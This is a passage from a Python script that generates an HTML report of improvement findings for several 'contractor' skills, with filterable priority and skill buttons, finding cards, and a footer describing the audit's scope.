    parts.append(f"<tr><td><a href='https://github.com/{esc(name)}'>{esc(name)}</a></td>"
                 f"<td class='sz'>{esc(sz)}</td><td>{esc(desc)}</td><td class='mono' style='font-size:12px;color:#8b95a3'>{esc(maps)}</td></tr>")
parts.append("</tbody></table>")

# TOC
parts.append('<h2 class="section">Skills</h2><div class="toc">')
for sk in SKILLS:
    n=len(SKILLS[sk]["findings"])
    parts.append(f'<a href="#sk-{esc(sk)}">{esc(sk)} <span style="color:#8b95a3">({n})</span></a>')
parts.append('</div>')

# Toolbar
parts.append("""
<div class="toolbar">
  <span class="lbl">Priority</span>
  <div class="grp">
    <span class="btn p-high active" data-pri="high" onclick="tp(this)">High</span>
    <span class="btn p-medium active" data-pri="medium" onclick="tp(this)">Medium</span>
    <span class="btn p-low active" data-pri="low" onclick="tp(this)">Low</span>
  </div>
  <span class="lbl" style="margin-left:14px">Skill</span>
  <div class="grp" id="skillbtns">
    <span class="btn active" data-skill="all" onclick="ts(this)">All</span>
""")
for sk in SKILLS:
    parts.append(f'<span class="btn" data-skill="{esc(sk)}" onclick="ts(this)">{esc(sk)}</span>')
parts.append('</div></div>')

# Findings
for sk, data in SKILLS.items():
    parts.append(f'<div class="skill-block" data-skill="{esc(sk)}" id="sk-{esc(sk)}">')
    parts.append(f'<div class="skill-head"><h3>{esc(sk)}</h3>'
                 f'<span class="path mono">contractor/skills/{esc(sk)}/</span></div>')
    parts.append(f'<div class="skill-blurb">{esc(data["blurb"])}</div>')
    for f in sorted(data["findings"], key=lambda x: PRI_ORDER[x["pri"]]):
        p=f["pri"]
        parts.append(f'<div class="card {p}" data-pri="{p}" data-skill="{esc(sk)}">')
        parts.append(f'<div class="top"><div class="ttl">{esc(f["title"])}</div>'
                     f'<span class="badge {p}">{p}</span></div>')
        parts.append(f'<div class="file mono">{esc(f["file"])}</div>')
        parts.append(f'<div class="fld"><div class="k">Gap</div><div class="v">{esc(f["gap"])}</div></div>')
        parts.append(f'<div class="fld evi"><div class="k">Evidence</div><div class="v mono">{esc(f["evidence"])}</div></div>')
        parts.append(f'<div class="fld"><div class="k">Recommendation</div><pre class="rec">{esc(f["rec"])}</pre></div>')
        parts.append('</div>')
    parts.append('</div>')

parts.append('<div class="empty" id="empty">No findings match the current filters.</div>')

parts.append("""
<footer>
<strong>Notes.</strong> The Caido reference repo (caido/community) is not public, so the caido skill was audited on
internal quality + Caido architecture. The likec4 skill is a near-exact fork of upstream's likec4-dsl skill and
trails v1.57.0 by two DSL features. All security recommendations are transferable technique/coverage gaps drawn from
canonical corpora — none encode a specific benchmark's bugs or sinks (per the no-overfit-eval-skills rule).
Local clones live under <code>docs/research/repos/</code> and are git-ignored.
</footer>
""")

parts.append("""
<script>
var pset={high:1,medium:1,low:1}, sk='all';
function apply(){
  document.querySelectorAll('.skill-block').forEach(function(b){
    var bs=b.getAttribute('data-skill'); var show=(sk==='all'||sk===bs); var any=false;
    b.querySelectorAll('.card').forEach(function(c){
      var ok=show && pset[c.getAttribute('data-pri')]; c.style.display=ok?'':'none'; if(ok)any=true;
    });
    b.style.display=(show&&any)?'':'none';
  });
  var vis=document.querySelectorAll('.card').length && [].some.call(document.querySelectorAll('.card'),function(c){return c.style.display!=='none'});
  document.getElementById('empty').style.display=vis?'none':'block';
}
function tp(el){var p=el.getAttribute('data-pri'); pset[p]=!pset[p]; el.classList.toggle('active'); apply();}
function ts(el){sk=el.getAttribute('data-skill');
  document.querySelectorAll('#skillbtns .btn').forEach(function(b){b.classList.remove('active')});
  el.classList.add('active'); apply();}
apply();
</script>
</div></body></html>""")

out = "\n".join(parts)
path = Path(__file__).resolve().parents[1] / "reports" / "contractor" / "skills-improvement-report.html"
path.write_text(out, encoding="utf-8")
print("wrote", path, len(out), "bytes,", total, "findings")
